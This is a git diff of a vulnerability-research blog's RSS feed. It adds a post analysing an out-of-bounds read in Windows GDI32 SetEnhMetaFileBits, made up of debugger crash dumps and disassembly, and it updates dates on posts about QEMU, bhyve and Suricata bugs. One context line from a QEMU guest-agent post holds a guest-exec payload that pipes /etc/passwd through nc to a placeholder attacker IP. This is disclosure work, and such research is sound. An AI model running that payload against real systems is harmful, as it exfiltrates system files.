@@ -5,9 +5,170 @@
     <description>A fan of sofware bugs and vulnerabilities.</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>2020-05-19</pubDate>
-    <lastBuildDate>Tue, 19 May 2020 08:26:51 +0000</lastBuildDate>
+    <pubDate>2020-05-20</pubDate>
+    <lastBuildDate>Wed, 20 May 2020 05:40:54 +0000</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>Windows GDI SetEnhMetaFileBits - Out-of-Bounds Read</title>
+        <description>&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+
+&lt;p&gt;One of my fuzzing harness triggered a crash in &lt;strong&gt;GDI32!SetEnhMetaFileBits&lt;/strong&gt; function when it tries to copy a user-controlled data to a local dynamically allocated memory space. The crash was analyzed to be a &lt;strong&gt;Read Access Violation&lt;/strong&gt; and marked as &lt;strong&gt;PROBABLY_NOT_EXPLOITABLE&lt;/strong&gt;. After doing a bit of debugging I found out that it could be leveraged into an &lt;strong&gt;Information Leakage&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;crash-analysis&quot;&gt;Crash Analysis&lt;/h1&gt;
+
+&lt;p&gt;Initial crash:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ModLoad: 75ff0000 7601b000   C:\Windows\SysWOW64\IMM32.DLL
+ModLoad: 77a10000 77b30000   C:\Windows\SysWOW64\MSCTF.dll
+ModLoad: 77bb0000 77c6e000   C:\Windows\SysWOW64\msvcrt.dll
+(4a4.1844): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+*** WARNING: Unable to verify checksum for SetEnhMetaFileBits.exe
+eax=800fdf70 ebx=00000000 ecx=00000000 edx=00000000 esi=77527e70 edi=800fdf70
+eip=775283dc esp=00b4f968 ebp=00b4f970 iopl=0         nv up ei ng nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010296
+GDI32!SetEnhMetaFileBits+0x1c:
+775283dc 8b4230          mov     eax,dword ptr [edx+30h] ds:002b:00000030=????????
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Backtrace:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # ChildEBP RetAddr  Args to Child              
+00 00b4f970 00c210cb 800fdf70 00000000 00d73fb8 GDI32!SetEnhMetaFileBits+0x1c (FPO: [2,0,0])
+01 00b4f98c 00c212b5 d646100c 00d73fb8 00d75108 SetEnhMetaFileBits!main+0x8b (FPO: [Non-Fpo]) (CONV: cdecl) [c:\users\user\desktop\harness\gdi32.dll\setenhmetafilebits\setenhmetafilebits\setenhmetafilebits.cpp @ 30] 
+02 (Inline) -------- -------- -------- -------- SetEnhMetaFileBits!invoke_main+0x1c (Inline Function @ 00c212b5) (CONV: cdecl) [d:\agent\_work\3\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 78] 
+03 00b4f9d4 75eb3744 7eabe000 75eb3720 cd66120d SetEnhMetaFileBits!__scrt_common_main_seh+0xfa (FPO: [Non-Fpo]) (CONV: cdecl) [d:\agent\_work\3\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 288] 
+04 00b4f9e8 77d79e54 7eabe000 d4b66b70 00000000 KERNEL32!BaseThreadInitThunk+0x24 (FPO: [Non-Fpo])
+05 00b4fa30 77d79e1f ffffffff 77d9d6e2 00000000 ntdll!__RtlUserThreadStart+0x2f (FPO: [Non-Fpo])
+06 00b4fa40 00000000 00c2133d 7eabe000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Exploitability check:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!exploitable 1.6.0.0
+HostMachine\HostUser
+Executing Processor Architecture is x86
+Debuggee is in User Mode
+Debuggee is a live user mode debugging session on the local machine
+Event Type: Exception
+Exception Faulting Address: 0x30
+First Chance Exception Type: STATUS_ACCESS_VIOLATION (0xC0000005)
+Exception Sub-Type: Read Access Violation
+
+Faulting Instruction:775283dc mov eax,dword ptr [edx+30h]
+
+Basic Block:
+    775283dc mov eax,dword ptr [edx+30h]
+       Tainted Input operands: 'edx'
+    775283df cmp dword ptr [ebp+8],eax
+       Tainted Input operands: 'eax'
+    775283e2 jb gdi32!setenhmetafilebits+0x5a (7752841a)
+       Tainted Input operands: 'CarryFlag'
+
+Exception Hash (Major/Minor): 0x6871032f.0x4129c86e
+
+ Hash Usage : Stack Trace:
+Major+Minor : GDI32!SetEnhMetaFileBits+0x1c
+Major+Minor : SetEnhMetaFileBits!main+0x8b
+Major+Minor : SetEnhMetaFileBits!__scrt_common_main_seh+0xfa
+Major+Minor : KERNEL32!BaseThreadInitThunk+0x24
+Major+Minor : ntdll!__RtlUserThreadStart+0x2f
+Minor       : ntdll!_RtlUserThreadStart+0x1b
+Instruction Address: 0x00000000775283dc
+
+Description: Read Access Violation near NULL
+Short Description: ReadAVNearNull
+Exploitability Classification: PROBABLY_NOT_EXPLOITABLE
+Recommended Bug Title: Read Access Violation near NULL starting at GDI32!SetEnhMetaFileBits+0x000000000000001c (Hash=0x6871032f.0x4129c86e)
+
+This is a user mode read access violation near null, and is probably not exploitable.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;bug-analysis&quot;&gt;Bug Analysis&lt;/h1&gt;
+
+&lt;p&gt;This is how it was initially triggered by my harness. We can clearly see that the 2nd argument is NULL.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;eax=800fdf70 ebx=00000000 ecx=00000000 edx=00ff8360 esi=77527e70 edi=800fdf70
+eip=775283c0 esp=00d2f730 ebp=00d2f748 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+GDI32!SetEnhMetaFileBits:
+775283c0 8bff            mov     edi,edi
+0:000&amp;gt; dd esp
+00d2f730  00c210cb 800fdf70 00000000 00ff3fb8
+00d2f740  71fe2108 7eb77000 00d2f790 00c212b5
+00d2f750  1f460d5d 00ff3fb8 00ff5ed0 5b6e5a06
+00d2f760  00c2133d 00c2133d 7eb77000 00000000
+00d2f770  00000000 00000000 00d2f75c 00000000
+00d2f780  00d2f7dc 00c21a6b 5b7e88d6 00000000
+00d2f790  00d2f7a4 75eb3744 7eb77000 75eb3720
+00d2f7a0  33b18477 00d2f7ec 77d79e54 7eb77000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can confirm with the disassembly code below that our tainted input will go down to this path.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:0000000180040089                 test    r13b, 1
+.text:000000018004008D                 jnz     loc_18004019F
+.text:0000000180040093                 mov     edx, [rsi+30h]  ; uBytes
+.text:0000000180040096                 xor     ecx, ecx        ; uFlags
+.text:0000000180040098                 call    cs:__imp_LocalAlloc
+.text:000000018004009E                 mov     [rbx+20h], rax
+.text:00000001800400A2                 test    rax, rax
+.text:00000001800400A5                 jz      loc_18006C72D
+.text:00000001800400AB                 mov     r8d, [rsi+30h]  ; Size
+.text:00000001800400AF                 mov     rdx, rsi        ; Src
+.text:00000001800400B2                 mov     rcx, rax        ; Dst
+.text:00000001800400B5                 call    memcpy_0
+.text:00000001800400BA                 mov     ecx, [rsi+30h]
+.text:00000001800400BD                 mov     rax, [rbx+20h]
+.text:00000001800400C1                 mov     [rbx+30h], rax
+.text:00000001800400C5                 mov     [rbx+38h], rcx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With a little bit of modification to the harness. It is now pointing to a buffer someplace where the user can control and if the buffer is crafted correctly the &lt;strong&gt;GDI32!pmfAllocMF&lt;/strong&gt; will end up using part of the buffer as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntdll!memcpy&lt;/code&gt; length. So from there we can find a way to achieve info-leak but it is trivial so I will leave it as an exercise to the readers :).&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;eax=00000000 ebx=00fd8fe8 ecx=00000001 edx=00fd8808 esi=77527e70 edi=800fdf70
+eip=775283c0 esp=00d7f7fc ebp=00d7f814 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+GDI32!SetEnhMetaFileBits:
+775283c0 8bff            mov     edi,edi
+0:000&amp;gt; dd esp
+00d7f7fc  009c10d8 800fdf70 00fd8fe8 00fd3fb8
+00d7f80c  71fe2108 7f1c5000 00d7f85c 009c12cb
+00d7f81c  6b4610c4 00fd3fb8 00fd5108 42630ad1
+00d7f82c  009c1353 009c1353 7f1c5000 00000000
+00d7f83c  00000000 00000000 00d7f828 00000000
+00d7f84c  00d7f8a8 009c1aab 4228d595 00000000
+00d7f85c  00d7f870 75eb3744 7f1c5000 75eb3720
+00d7f86c  56109131 00d7f8b8 77d79e54 7f1c5000
+0:000&amp;gt; g
+(d90.394): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00fd8fe8 ecx=006c6006 edx=00000000 esi=02af0ffc edi=04609034
+eip=77d8e8e3 esp=00d7f794 ebp=00d7f79c iopl=0         nv dn ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010616
+ntdll!memcpy+0x213:
+77d8e8e3 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+0:000&amp;gt; kv
+ # ChildEBP RetAddr  Args to Child              
+00 00d7f79c 774feed1 02af1020 00fd8fe8 41414141 ntdll!memcpy+0x213
+01 00d7f7d4 775283f7 00000000 00000000 00000000 GDI32!pmfAllocMF+0x36197
+02 00d7f7f8 009c10d8 800fdf70 00fd8fe8 00fd3fb8 GDI32!SetEnhMetaFileBits+0x37 (FPO: [2,0,0])
+03 00d7f814 009c12cb 6b4610c4 00fd3fb8 00fd5108 SetEnhMetaFileBits!main+0x98 (FPO: [Non-Fpo]) (CONV: cdecl) [c:\users\user\desktop\harness\gdi32.dll\setenhmetafilebits\setenhmetafilebits\setenhmetafilebits.cpp @ 31] 
+04 (Inline) -------- -------- -------- -------- SetEnhMetaFileBits!invoke_main+0x1c (Inline Function @ 009c12cb) (CONV: cdecl) [d:\agent\_work\3\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 78] 
+05 00d7f85c 75eb3744 7f1c5000 75eb3720 56109131 SetEnhMetaFileBits!__scrt_common_main_seh+0xfa (FPO: [Non-Fpo]) (CONV: cdecl) [d:\agent\_work\3\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 288] 
+06 00d7f870 77d79e54 7f1c5000 961a92d3 00000000 KERNEL32!BaseThreadInitThunk+0x24 (FPO: [Non-Fpo])
+07 00d7f8b8 77d79e1f ffffffff 77d9d6d2 00000000 ntdll!__RtlUserThreadStart+0x2f (FPO: [Non-Fpo])
+08 00d7f8c8 00000000 009c1353 7f1c5000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>2020-05-20</pubDate>
+        <link>http://localhost:4000/articles/2020-05/microsoft_windows_gdi32_setenhmetafilebits</link>
+        <guid isPermaLink="true">http://localhost:4000/articles/2020-05/microsoft_windows_gdi32_setenhmetafilebits</guid>
+        
+        <category>Windows GDI</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
     
       <item>
         <title>Suricata - ReadErfFile Stack-based Buffer Overflow</title>
@@ -47,7 +208,7 @@
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-05-19</pubDate>
+        <pubDate>2020-05-20</pubDate>
         <link>http://localhost:4000/articles/2020-04/suricata_stack_based_overflow</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2020-04/suricata_stack_based_overflow</guid>
         
@@ -115,7 +276,7 @@
 
 &lt;p&gt;Going down the rabbit hole right before the data is insert into the hash table through &lt;strong&gt;emu_hashtable_insert&lt;/strong&gt; at line 70. &lt;strong&gt;emu_hashtable_search&lt;/strong&gt; is called to check whether the data is already inserted or not. At line 96, the address of the key inside the hash table will be divided with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eh-&amp;gt;size&lt;/code&gt; and triggers the bug.&lt;/p&gt;
 </description>
-        <pubDate>2020-05-19</pubDate>
+        <pubDate>2020-05-20</pubDate>
         <link>http://localhost:4000/articles/2020-03/libemu_divide_by_zero</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2020-03/libemu_divide_by_zero</guid>
         
@@ -236,7 +397,7 @@ diff --git a/mo&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dules&lt;/span&gt;&l
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-05-19</pubDate>
+        <pubDate>2020-05-20</pubDate>
         <link>http://localhost:4000/articles/2019-08/ipv6_neighbor_router_advertisement</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-08/ipv6_neighbor_router_advertisement</guid>
         
@@ -337,7 +498,7 @@ gs_base 0x0 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-05-19</pubDate>
+        <pubDate>2020-05-20</pubDate>
         <link>http://localhost:4000/articles/2019-08/bhyve_fbuf_null_deref</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-08/bhyve_fbuf_null_deref</guid>
         
@@ -392,7 +553,7 @@ gs_base 0x0 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;corrupt stack?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 </description>
-        <pubDate>2020-05-19</pubDate>
+        <pubDate>2020-05-20</pubDate>
         <link>http://localhost:4000/articles/2019-07/CVE-2019-13614</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-07/CVE-2019-13614</guid>
         
@@ -457,7 +618,7 @@ Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-05-19</pubDate>
+        <pubDate>2020-05-20</pubDate>
         <link>http://localhost:4000/articles/2019-07/CVE-2019-13613</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-07/CVE-2019-13613</guid>
         
@@ -1831,7 +1992,7 @@ Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-05-19</pubDate>
+        <pubDate>2020-05-20</pubDate>
         <link>http://localhost:4000/articles/2019-06/bhyve_hda_bof</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-06/bhyve_hda_bof</guid>
         
@@ -1854,7 +2015,7 @@ Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'execute':'guest-exec'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'arguments':&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'path':'/bin/bash'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'arg':&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'-c'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'cat&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/etc/passwd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;attacker_ip&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9999&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]}}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 </description>
-        <pubDate>2020-05-19</pubDate>
+        <pubDate>2020-05-20</pubDate>
         <link>http://localhost:4000/articles/2019-06/CVE-2019-12929</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-06/CVE-2019-12929</guid>
         
@@ -1882,63 +2043,9 @@ Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o
 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;return&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 </description>
-        <pubDate>2020-05-19</pubDate>
+        <pubDate>2020-05-20</pubDate>
         <link>http://localhost:4000/articles/2019-06/CVE-2019-12928</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-06/CVE-2019-12928</guid>
-        
-        <category>qemu</category>
-        
-        
-        <category>proof-of-concept</category>
-        
-      </item>
-    
-      <item>
-        <title>[CVE-2019-5008] QEMU sun4u NULL Pointer Dereference</title>
-        <description>
-&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
-&lt;p&gt;QEMU 3.1.50 is vulnerable to a NULL pointer dereference, which allows the attacker to cause a denial of service via a device driver. &lt;sup id=&quot;fnref:1&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;patch-analysis&quot;&gt;Patch Analysis&lt;/h1&gt;
-&lt;p&gt;Patch diff:&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;diff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;git&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sparc64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sun4u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sparc64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sun4u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f76b19e4e9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5772&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;da02cb&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100644&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;---&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sparc64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sun4u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+++&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sparc64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sun4u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;@@&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;214&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;214&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;@@&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PowerDevice&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
- &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PowerDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
- &lt;span class=&quot;cm&quot;&gt;/* Power */&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;power_mem_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opaque&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hwaddr&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
- &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;power_mem_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opaque&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hwaddr&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                             &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
- &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;@@&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;224&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;229&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;@@&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;power_mem_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opaque&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hwaddr&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
- &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
- &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MemoryRegionOps&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;power_mem_ops&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;power_mem_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-     &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;power_mem_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-     &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endianness&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DEVICE_NATIVE_ENDIAN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
